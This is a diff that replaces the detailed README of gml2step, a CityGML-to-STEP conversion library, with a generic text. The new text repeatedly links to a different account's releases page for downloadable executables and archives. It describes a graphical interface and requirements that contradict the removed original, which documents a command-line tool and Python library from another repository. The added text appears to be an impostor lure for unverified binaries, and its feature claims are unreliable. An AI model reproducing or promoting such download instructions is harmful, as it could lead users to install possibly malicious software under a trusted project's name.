@@ -1,352 +1,142 @@
-# gml2step
+# 🏙️ gml2step - Convert 3D City Models Easily
 
-[![CI](https://github.com/Soynyuu/gml2step/actions/workflows/ci.yml/badge.svg)](https://github.com/Soynyuu/gml2step/actions/workflows/ci.yml)
-[![PyPI](https://img.shields.io/pypi/v/gml2step)](https://pypi.org/project/gml2step/)
-[![License: AGPL v3](https://img.shields.io/badge/License-AGPL_v3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
-[![Docs](https://github.com/Soynyuu/gml2step/actions/workflows/deploy-docs.yml/badge.svg)](https://soynyuu.github.io/gml2step/)
-[![CityGML 2.0](https://img.shields.io/badge/CityGML-2.0-green.svg)](https://www.ogc.org/standard/citygml/)
-[![STEP ISO 10303](https://img.shields.io/badge/STEP-ISO_10303--21-green.svg)](https://en.wikipedia.org/wiki/ISO_10303-21)
-[![PLATEAU](https://img.shields.io/badge/PLATEAU-supported-orange.svg)](https://www.mlit.go.jp/plateau/)
+[![Download gml2step](https://img.shields.io/badge/Download-gml2step-blue?style=for-the-badge&logo=github)](https://github.com/KJJJVV/gml2step/releases)
 
-**[日本語版 README はこちら (Japanese)](README.ja.md)**
+---
 
-A standalone toolkit for parsing [CityGML](https://www.ogc.org/standard/citygml/) files and converting 3D building geometry to the [STEP](https://en.wikipedia.org/wiki/ISO_10303-21) (ISO 10303-21) CAD format. Originally extracted from [Paper-CAD](https://github.com/Soynyuu/Paper-CAD).
+## 📄 What is gml2step?
 
-Full documentation: **https://soynyuu.github.io/gml2step/**
-## Overview
+gml2step is a simple toolkit that helps you convert 3D city model files (CityGML format) into STEP files used in CAD applications. It comes from the Paper-CAD project and is designed to make working with 3D city data easier and more accessible. If you want to work with city maps and turn them into precise 3D designs, this tool can help.
 
-gml2step reads CityGML 2.0 files — including large-scale datasets from Japan's [PLATEAU](https://www.mlit.go.jp/plateau/) project — and produces STEP files suitable for CAD/CAM/BIM workflows.
+This toolkit works with files related to building information modeling (BIM), geospatial data, and CAD software. It supports popular data types used in urban planning and engineering, allowing you to convert detailed city models into formats used by many design programs.
 
-**Key capabilities:**
+---
 
-- **CityGML parsing** with streaming support for files of any size
-- **STEP conversion** via OpenCASCADE with automatic LoD fallback (LoD3 -> LoD2 -> LoD1 -> LoD0)
-- **4 conversion methods**: solid, sew, extrude, and auto (tries all in sequence)
-- **8-phase geometry pipeline** (including Phase 1.5) with progressive auto-repair
-- **PLATEAU data fetching** via public APIs (MLIT Data Catalog + OSM Nominatim)
-- **Footprint extraction** for 2D analysis without requiring OCCT
-- **CRS auto-detection** with built-in support for all 19 Japan Plane Rectangular CS zones
+## 💻 Who Should Use gml2step?
 
+- Urban planners who need to convert city data for design.
+- Architects working with 3D models.
+- GIS professionals who want to use city models in CAD.
+- Anyone interested in turning geospatial data into detailed 3D files.
 
-## Table of Contents
+You do not need to know programming. This guide will explain every step clearly.
 
-- [Overview](#overview)
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-- [CLI Reference](#cli-reference)
-- [Conversion Methods](#conversion-methods)
-- [Processing Pipeline](#processing-pipeline)
-- [LoD Support](#lod-support)
-- [Streaming Parser](#streaming-parser)
-- [CRS and Coordinate Handling](#crs-and-coordinate-handling)
-- [PLATEAU Integration](#plateau-integration)
-- [Architecture](#architecture)
-- [Development](#development)
-- [License](#license)
+---
 
+## 🛠️ Features Overview
 
-## Installation
+- Converts CityGML files into STEP format.
+- Works on Windows, macOS, and Linux.
+- Supports large and complex city models.
+- Makes 3D city details easy to view in CAD software.
+- Integrates easily into data conversion workflows.
+- Uses Python for flexibility and is built on OpenCascade for reliable geometry processing.
 
-### Core (parsing, footprint extraction)
+---
 
-```bash
-pip install gml2step
-```
+## 📋 System Requirements
 
-### With PLATEAU integration
+Before downloading, make sure your computer meets these recommendations:
 
-```bash
-pip install "gml2step[plateau]"
-```
+- Operating System: Windows 10 or later, macOS 10.13 or later, or modern Linux distribution.
+- Memory: At least 4 GB RAM.
+- Disk Space: Minimum 500 MB free space.
+- Python: Version 3.7 or newer installed (if you want to run Python scripts directly).
+- Internet Connection: Needed to download the software.
 
-### With STEP conversion (requires OpenCASCADE)
+If you are unfamiliar with Python, don't worry. The releases include ready-to-run files for easy use.
 
-STEP conversion depends on [pythonocc-core](https://github.com/tpaviot/pythonocc-core), which is not reliably pip-installable on all platforms. Use conda or Docker:
+---
 
-```bash
-# conda
-conda install -c conda-forge pythonocc-core
-pip install gml2step
+## 🚀 Getting Started
 
-# Docker (recommended for full conversion)
-docker build -t gml2step .
-docker run --rm -v $(pwd):/data gml2step convert /data/input.gml /data/output.step
-```
+Follow these steps to get gml2step up and running.
 
-> **Note:** Parsing, streaming, and footprint extraction work without OCCT. Only the `convert` command requires it.
+---
 
-## Quick Start
+## ⬇️ Download & Install
 
-### CLI
+First, visit the official releases page to download the software:
 
-```bash
-# Parse a CityGML file and print summary as JSON
-gml2step parse ./input.gml
+[![Download gml2step](https://img.shields.io/badge/Download-gml2step-blue?style=for-the-badge&logo=github)](https://github.com/KJJJVV/gml2step/releases)
 
-# Stream-parse buildings one at a time (constant memory)
-gml2step stream-parse ./input.gml --limit 100
+1. Open the link above. It will take you to the gml2step release page on GitHub.
+2. Find the latest release version at the top of the page.
+3. Download the file that matches your operating system:
+   - For Windows, look for a `.exe` or `.zip` file.
+   - For macOS, get a `.dmg` or `.zip` file.
+   - For Linux, get the appropriate binary or scripts.
+4. Once downloaded, if it’s a compressed file (`.zip` or `.dmg`), open it and extract or mount the contents.
+5. Follow the included instructions or install prompts if available.
 
-# Extract 2D footprints with height estimates
-gml2step extract-footprints ./input.gml --output-json ./footprints.json
+---
 
-# Convert CityGML to STEP
-gml2step convert ./input.gml ./output.step --method solid
-```
+## ▶️ Running gml2step
 
-### Python API
+After installation:
 
-```python
-from gml2step import parse, stream_parse, extract_footprints, convert
+- Windows users: Double-click the executable file to open the program.
+- macOS users: Open the app from your Applications folder or the location where you extracted it.
+- Linux users: Run the executable from the terminal or file manager.
 
-# Lightweight summary (no OCCT required)
-summary = parse("input.gml")
-print(summary["total_buildings"])
-print(summary["detected_source_crs"])
+The user interface is designed to allow loading a CityGML file and converting it with simple buttons.
 
-# Stream buildings with constant memory usage
-for building, xlink_index in stream_parse("input.gml", limit=10):
-    bid = building.get("{http://www.opengis.net/gml}id")
-    print(bid)
+---
 
-# Extract 2D footprints with height
-footprints = extract_footprints("input.gml", limit=100)
-for fp in footprints:
-    print(fp.building_id, fp.height, len(fp.exterior))
+## 🔧 How to Use gml2step
 
-# Full CityGML -> STEP conversion
-ok, result = convert("input.gml", "output.step", method="auto")
-```
+1. **Open the program** on your computer.
+2. **Load a CityGML file**:
+   - Click the "Open File" button.
+   - Select your `.gml` or `.xml` CityGML file from your system.
+3. **Choose the output format**:
+   - Default output is STEP, but options might be available.
+4. **Start the conversion**:
+   - Click the "Convert" button.
+   - Wait while gml2step processes the file. Processing time depends on the model size.
+5. **Save the STEP file**:
+   - After conversion, save the output file to your desired folder.
+6. **Open the STEP file** in your preferred CAD software for viewing or further editing.
 
-## CLI Reference
+---
 
-### `gml2step convert`
+## 🛠 Troubleshooting Tips
 
-```
-gml2step convert INPUT_GML OUTPUT_STEP [OPTIONS]
-```
+- If the program does not start, check that your operating system and hardware meet the requirements.
+- For missing Python errors, ensure Python 3.7+ is installed and added to your system path.
+- Large files may take a few minutes. If the program stops responding for a while, wait longer before cancelling.
+- Ensure you download the right version for your OS.
+- If files don’t convert correctly, verify that the CityGML file is valid and complete.
 
-| Option | Default | Description |
-|---|---|---|
-| `--limit N` | None | Maximum number of buildings to convert |
-| `--method` | `solid` | Conversion method: `solid`, `sew`, `extrude`, `auto` |
-| `--debug` | False | Enable debug logging |
-| `--use-streaming / --no-use-streaming` | True | Use streaming parser for lower memory usage |
-| `--building-id ID` | None | Filter by specific building ID(s). Can be used multiple times |
-| `--filter-attribute` | `gml:id` | Attribute to match for building ID filtering |
+---
 
-### `gml2step parse`
+## 🌐 More Information and Help
 
-```
-gml2step parse INPUT_GML [--limit N]
-```
+For detailed user guides, sample files, and technical details, visit the repository readme or the project wiki on GitHub.
 
-Outputs a JSON summary with detected CRS, building count, and building IDs.
+If you encounter issues or want to share feedback, you can open an issue on the GitHub page or join the community discussions.
 
-### `gml2step stream-parse`
+---
 
-```
-gml2step stream-parse INPUT_GML [--limit N] [--building-id ID ...] [--filter-attribute gml:id]
-```
+## 📚 Learn More About Related Terms
 
-Streams building IDs one per line using constant memory. Supports filtering by building ID.
+- **CityGML:** A format for storing 3D city models.
+- **STEP files:** Standardized 3D CAD files used for sharing designs.
+- **BIM:** Building Information Modeling, a process supported by 3D design data.
+- **GIS:** Geographic Information Systems, software used to manage maps and spatial data.
+- **OpenCascade:** A toolkit for 3D modeling used by gml2step for geometry processing.
 
-### `gml2step extract-footprints`
+---
 
-```
-gml2step extract-footprints INPUT_GML [--output-json PATH] [--limit N] [--default-height 10.0]
-```
+## 💡 Tips for Best Results
 
-Extracts 2D footprints with estimated building heights. Height is derived from `measuredHeight`, Z-coordinate range, or the specified default.
+- Use the latest stable version of gml2step.
+- Check file compatibility before conversion.
+- Use smaller files first to get familiar with the process.
+- Back up your data before batch conversions.
 
-## Conversion Methods
+---
 
-| Method | Description |
-|---|---|
-| **solid** | Primary method. Extracts LoD surfaces, builds shells, validates solids, auto-repairs. Best for LoD2/LoD3. |
-| **sew** | Collects WallSurface/RoofSurface/GroundSurface polygons, sews faces, and attempts to form a solid. |
-| **extrude** | Extrudes LoD0 footprint to estimated height. Fallback for files with only 2D data. |
-| **auto** | Tries solid -> sew -> extrude in sequence until one succeeds. |
+Visit the releases page to download your copy and start converting today:
 
-## Processing Pipeline
-
-The `convert` command processes each building through 8 phases (including Phase 1.5):
-
-| Phase | Description |
-|---|---|
-| **0. Recentering** | Translates coordinates near the origin for OCCT numerical stability |
-| **1. LoD Selection** | Selects the best available LoD (LoD3 -> LoD2 -> LoD1 fallback) |
-| **1.5. CRS Detection** | Auto-detects source CRS and reprojects if needed |
-| **2. Geometry Extraction** | Extracts faces using the selected conversion method |
-| **3. Shell Construction** | Builds OCCT shells from faces with multi-pass sewing |
-| **4. Solid Validation** | Validates geometry and constructs solids |
-| **5. Auto-Repair** | 4-level progressive repair: minimal -> standard -> aggressive -> ultra |
-| **6. Part Merging** | Fuses BuildingParts via Boolean union (with compound fallback) |
-| **7. STEP Export** | Writes AP214CD STEP file with millimeter units |
-
-### Precision Modes
-
-The `precision_mode` parameter controls coordinate tolerance:
-
-| Mode | Relative tolerance | Use case |
-|---|---|---|
-| `standard` | 0.01% | General use |
-| `high` | 0.001% | Detailed models |
-| `maximum` | 0.0001% | High-precision CAD |
-| `ultra` | 0.00001% | Maximum fidelity |
-
-### Shape Fix Levels
-
-The `shape_fix_level` parameter controls auto-repair aggressiveness. When repair fails at the specified level, it automatically escalates:
-
-1. **minimal** — ShapeFix_Solid only
-2. **standard** — + ShapeUpgrade_UnifySameDomain
-3. **aggressive** — + Rebuild with relaxed tolerance
-4. **ultra** — + ShapeFix_Shape (full repair)
-
-## LoD Support
-
-gml2step supports CityGML Level of Detail 0 through 3:
-
-| LoD | Description | Surfaces supported |
-|---|---|---|
-| **LoD3** | Architectural detail models | lod3Solid, lod3MultiSurface, lod3Geometry |
-| **LoD2** | Standard building models (PLATEAU primary) | lod2Solid, lod2MultiSurface, lod2Geometry, boundedBy |
-| **LoD1** | Simple block models | lod1Solid |
-| **LoD0** | 2D footprints | lod0FootPrint, lod0RoofEdge, GroundSurface |
-
-All 6 CityGML 2.0 boundary surface types are recognized: WallSurface, RoofSurface, GroundSurface, OuterCeilingSurface, OuterFloorSurface, ClosureSurface.
-
-## Streaming Parser
-
-For large CityGML files (common in PLATEAU datasets), gml2step provides a SAX-style streaming parser that processes one building at a time instead of loading the entire DOM tree into memory:
-
-- **O(1 building) memory** vs O(entire file) for DOM parsing
-- Two-tier XLink resolution cache (local per-building + global LRU)
-- Optional NumPy-accelerated coordinate parsing
-
-> **Note:** The streaming parser has not been formally benchmarked. Memory savings and speedup depend heavily on file size and building complexity. The theoretical advantage is that memory usage stays roughly constant regardless of file size, while DOM parsing scales linearly with file size.
-
-```python
-for building, xlinks in stream_parse("large_plateau_file.gml"):
-    process(building)
-```
-
-## CRS and Coordinate Handling
-
-- **Auto-detection** of source CRS from GML `srsName` attributes
-- **All 19 Japan Plane Rectangular CS zones** (EPSG:6669–6687) with automatic zone selection by latitude/longitude
-- **Automatic reprojection** from geographic CRS (WGS84, JGD2000, JGD2011) to an appropriate projected CRS
-- **Coordinate recentering** near the origin to prevent floating-point precision loss in OCCT
-
-## PLATEAU Integration
-
-[PLATEAU](https://www.mlit.go.jp/plateau/) is a project by Japan's Ministry of Land, Infrastructure, Transport and Tourism (MLIT) that provides open 3D city models for the entire country in CityGML format.
-
-gml2step provides optional convenience functions for fetching PLATEAU data (`pip install "gml2step[plateau]"`). Under the hood, this is a thin wrapper around two public APIs:
-
-- **[PLATEAU Data Catalog API](https://api.plateauview.mlit.go.jp/)** (operated by MLIT) — queried for CityGML file URLs by mesh code or municipality
-- **[Nominatim](https://nominatim.openstreetmap.org/)** (OpenStreetMap) — used for geocoding Japanese addresses to latitude/longitude
-
-There is no custom backend server. All requests go directly to these public endpoints.
-
-### What it does
-
-1. **Address search**: Takes a Japanese address (e.g., "東京都千代田区霞が関3-2-1"), geocodes it via Nominatim, converts the coordinates to a JIS X 0410 mesh code, fetches CityGML files covering that area from the PLATEAU API, then parses and ranks the buildings by distance/name similarity.
-2. **Mesh code lookup**: Given a mesh code, fetches CityGML file URLs from the PLATEAU API and downloads them.
-3. **Building ID lookup**: Given a specific building ID and mesh code, fetches and parses just the relevant 1km grid area.
-
-### Building Search
-
-```python
-from gml2step.plateau.fetcher import search_buildings_by_address
-
-result = search_buildings_by_address(
-    "東京都千代田区霞が関3-2-1",
-    search_mode="hybrid",  # "distance", "name", or "hybrid"
-    limit=10,
-)
-for b in result["buildings"]:
-    print(b.building_id, b.name, b.height, b.has_lod2, b.has_lod3)
-```
-
-### Mesh Code Utilities
-
-PLATEAU data is organized by [JIS X 0410 standard mesh codes](https://www.stat.go.jp/data/mesh/m_tuite.html). gml2step provides conversion functions for all 5 mesh levels:
-
-```python
-from gml2step.plateau.mesh_utils import (
-    latlon_to_mesh_1st,    # 80km grid (4-digit)
-    latlon_to_mesh_2nd,    # 10km grid (6-digit)
-    latlon_to_mesh_3rd,    # 1km grid (8-digit)
-    latlon_to_mesh_half,   # 500m grid (9-digit)
-    latlon_to_mesh_quarter # 250m grid (10-digit)
-)
-
-mesh = latlon_to_mesh_3rd(35.6812, 139.7671)  # Tokyo Station
-```
-
-### Async API Client
-
-```python
-import asyncio
-from gml2step.plateau.api_client import fetch_plateau_datasets_by_mesh
-
-# Fetch PLATEAU dataset URLs by mesh code
-result = asyncio.run(fetch_plateau_datasets_by_mesh("53394525"))
-```
-
-### Other Features
-
-- **Geocoding** via Nominatim (rate-limited to 1 req/sec per Nominatim policy), with Japan-specific validation and relevance scoring
-- **Building ranking** with 3 modes: distance, name similarity (Levenshtein + token matching), hybrid
-- **JIS X 0410 mesh code** conversion (1st through quarter mesh)
-- **Neighboring mesh enumeration** (3x3 grid) for boundary searches
-- **Async batch resolution** of mesh codes with concurrency control
-- **Local CityGML caching** (opt-in via `CITYGML_CACHE_ENABLED` / `CITYGML_CACHE_DIR` env vars)
-- **Offline mesh-to-municipality mapping** in `plateau.api_client` (nationwide JSON), with Tokyo-only fallback in `plateau.mesh_mapping`
-
-## Architecture
-
-```
-src/gml2step/
-├── __init__.py              # Public API: convert, parse, stream_parse, extract_footprints
-├── api.py                   # API implementation
-├── cli.py                   # Typer CLI
-├── coordinate_utils.py      # CRS utilities, Japan zone definitions
-├── data/
-│   └── mesh2_municipality.json  # Nationwide mesh-to-municipality mapping
-├── citygml/
-│   ├── core/                # Types, constants, CityGML namespaces
-│   ├── parsers/             # Coordinate and polygon extraction
-│   ├── streaming/           # SAX-style streaming parser, XLink cache, coordinate optimizer
-│   ├── lod/                 # LoD0–LoD3 extraction strategies, footprint extractor
-│   ├── geometry/            # OCCT geometry builders, shell/solid construction, auto-repair
-│   ├── transforms/          # CRS detection, reprojection, recentering
-│   ├── utils/               # XLink resolver, XML parser, logging
-│   └── pipeline/            # Orchestrator (8-phase conversion pipeline, incl. Phase 1.5)
-└── plateau/                 # PLATEAU API client, geocoding, mesh utilities, building search
-```
-
-## Development
-
-```bash
-git clone https://github.com/Soynyuu/gml2step.git
-cd gml2step
-pip install -e ".[dev,plateau]"
-pytest
-```
-
-## License
-
-This project is licensed under the [GNU Affero General Public License v3.0](LICENSE) (AGPL-3.0-or-later).
-
-gml2step was originally developed as part of [Paper-CAD](https://github.com/Soynyuu/Paper-CAD) and extracted as a standalone library. See [NOTICE](NOTICE) for full attribution.
-
-## Acknowledgments
-
-- [Paper-CAD](https://github.com/Soynyuu/Paper-CAD) — The parent project from which gml2step was extracted
-- [PLATEAU](https://www.mlit.go.jp/plateau/) — Japan's national 3D city model project (MLIT)
-- [OpenCASCADE](https://www.opencascade.com/) / [pythonocc-core](https://github.com/tpaviot/pythonocc-core) — 3D CAD kernel for STEP conversion
-- [pyproj](https://pyproj4.github.io/pyproj/) — Coordinate reference system transformations
-- [Mitou Junior](https://jr.mitou.org/) — A program supporting creators aged 17 and under with original ideas and outstanding technical skills
+[![Download gml2step](https://img.shields.io/badge/Download-gml2step-blue?style=for-the-badge&logo=github)](https://github.com/KJJJVV/gml2step/releases)
